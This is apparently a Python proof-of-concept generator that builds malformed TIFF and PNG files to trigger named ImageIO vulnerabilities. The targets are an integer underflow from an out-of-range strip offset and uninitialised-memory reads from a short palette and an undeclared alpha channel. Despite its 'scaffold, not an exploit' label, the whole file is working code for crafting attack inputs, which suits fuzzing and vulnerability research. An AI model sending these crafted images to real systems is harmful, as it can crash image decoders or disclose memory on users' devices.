#!/usr/bin/env python3
"""
gen_imageio_underflow.py — SCAFFOLD, not an exploit.

Target : CVE-2026-112625 (ImageIO integer underflow) and the uninitialised
         memory disclosure family (112571 / 112632 / 112630).
Theory : a chunk/strip offset is larger than the buffer length, so an
         unsigned `len - offset` wraps; and a palette / alpha buffer is not
         fully initialised.
Usage  : python3 gen_imageio_underflow.py <tiff_underflow|png_palette_leak|
                                            tiff_extrasamples>
"""

import struct
import sys
import zlib

# ---------------------------------------------------------------------------
# TIFF helpers
# ---------------------------------------------------------------------------
TYPE_SHORT = 3
TYPE_LONG  = 4

def tiff_entry(tag, typ, count, value_or_offset):
    return struct.pack("<HHII", tag, typ, count, value_or_offset)

def build_tiff(entries, extra=b"", header_off_to_extra=0):
    """
    entries: list of (tag, type, count, value) where value is an int or bytes
    """
    n = len(entries)
    # Header: II 42 offset(8)
    out = bytearray(b"II\x2a\x00" + struct.pack("<I", 8))
    ifd_off = 8
    ifd_size = 2 + n * 12 + 4
    data_off = ifd_off + ifd_size
    data = bytearray()
    ifd = bytearray(struct.pack("<H", n))
    for tag, typ, count, val in entries:
        if isinstance(val, int):
            ifd += tiff_entry(tag, typ, count, val)
        else:
            ifd += tiff_entry(tag, typ, count, data_off + len(data))
            data += val
            if len(data) % 2:
                data += b"\x00"
    ifd += struct.pack("<I", 0)  # next IFD
    out += ifd
    out += data
    return bytes(out)

def variant_tiff_underflow():
    # Image 1x1, 8-bit, one strip. StripOffsets points far past EOF.
    width, height = 1, 1
    bps = struct.pack("<H", 8)
    entries = [
        (256, TYPE_LONG, 1, width),           # ImageWidth
        (257, TYPE_LONG, 1, height),          # ImageLength
        (258, TYPE_SHORT, 1, 8),              # BitsPerSample
        (259, TYPE_SHORT, 1, 1),              # Compression = none
        (262, TYPE_SHORT, 1, 1),              # Photometric = BlackIsZero
        (273, TYPE_LONG, 1, 0x7FFFFFF0),      # StripOffsets <-- BUG
        (277, TYPE_SHORT, 1, 1),              # SamplesPerPixel
        (278, TYPE_LONG, 1, height),          # RowsPerStrip
        (279, TYPE_LONG, 1, 1),               # StripByteCounts
        (284, TYPE_SHORT, 1, 1),              # PlanarConfiguration
    ]
    return build_tiff(entries)

def variant_png_palette_leak():
    """
    PNG with bit depth 8 but a PLTE of only 2 entries; pixels reference
    indices 0..255, so the decoder reads past the palette (or leaves the
    expanded palette uninitialised).
    """
    sig = b"\x89PNG\r\n\x1a\n"
    def chunk(typ, data):
        return (struct.pack(">I", len(data)) + typ + data +
                struct.pack(">I", zlib.crc32(typ + data) & 0xFFFFFFFF))

    ihdr = struct.pack(">IIBBBBB", 16, 16, 8, 3, 0, 0, 0)  # 8-bit palette
    # Only 2 palette entries, but 8-bit indices can address 256.
    plte = bytes([0, 0, 0, 255, 255, 255])
    # 16 rows of 1 filter byte + 16 indices, all 0xFF.
    raw = b""
    for _ in range(16):
        raw += b"\x00" + b"\xff" * 16
    idat = zlib.compress(raw)
    return sig + chunk(b"IHDR", ihdr) + chunk(b"PLTE", plte) + \
           chunk(b"IDAT", idat) + chunk(b"IEND", b"")

def variant_tiff_extrasamples():
    """
    SamplesPerPixel = 4 but ExtraSamples = 0, so the 4th channel (alpha)
    is present but undeclared; decoders that allocate by declared extras
    leave it uninitialised and then use it.
    """
    width, height = 4, 4
    entries = [
        (256, TYPE_LONG, 1, width),
        (257, TYPE_LONG, 1, height),
        (258, TYPE_SHORT, 4, struct.pack("<HHHH", 8, 8, 8, 8)),
        (259, TYPE_SHORT, 1, 1),
        (262, TYPE_SHORT, 1, 2),              # RGB
        (273, TYPE_LONG, 1, 0),
        (277, TYPE_SHORT, 1, 4),              # 4 samples
        (278, TYPE_LONG, 1, height),
        (279, TYPE_LONG, 1, width * height * 4),
        (284, TYPE_SHORT, 1, 1),
        # ExtraSamples deliberately omitted.
    ]
    # Patch the StripOffsets to point at real pixel data appended after IFD.
    t = build_tiff(entries)
    pixel_off = len(t)
    pixels = b"\x00" * (width * height * 4)
    # Rewrite StripOffsets (tag 273) value in place.
    idx = t.find(struct.pack("<HHI", 273, TYPE_LONG, 1))
    t = bytearray(t)
    if idx >= 0:
        struct.pack_into("<I", t, idx + 8, pixel_off)
    return bytes(t) + pixels

def main():
    modes = ("tiff_underflow", "png_palette_leak", "tiff_extrasamples")
    if len(sys.argv) != 2 or sys.argv[1] not in modes:
        sys.stderr.write(__doc__)
        return 2
    fn = {"tiff_underflow": variant_tiff_underflow,
          "png_palette_leak": variant_png_palette_leak,
          "tiff_extrasamples": variant_tiff_extrasamples}[sys.argv[1]]
    sys.stdout.buffer.write(fn())
    return 0

if __name__ == "__main__":
    sys.exit(main())
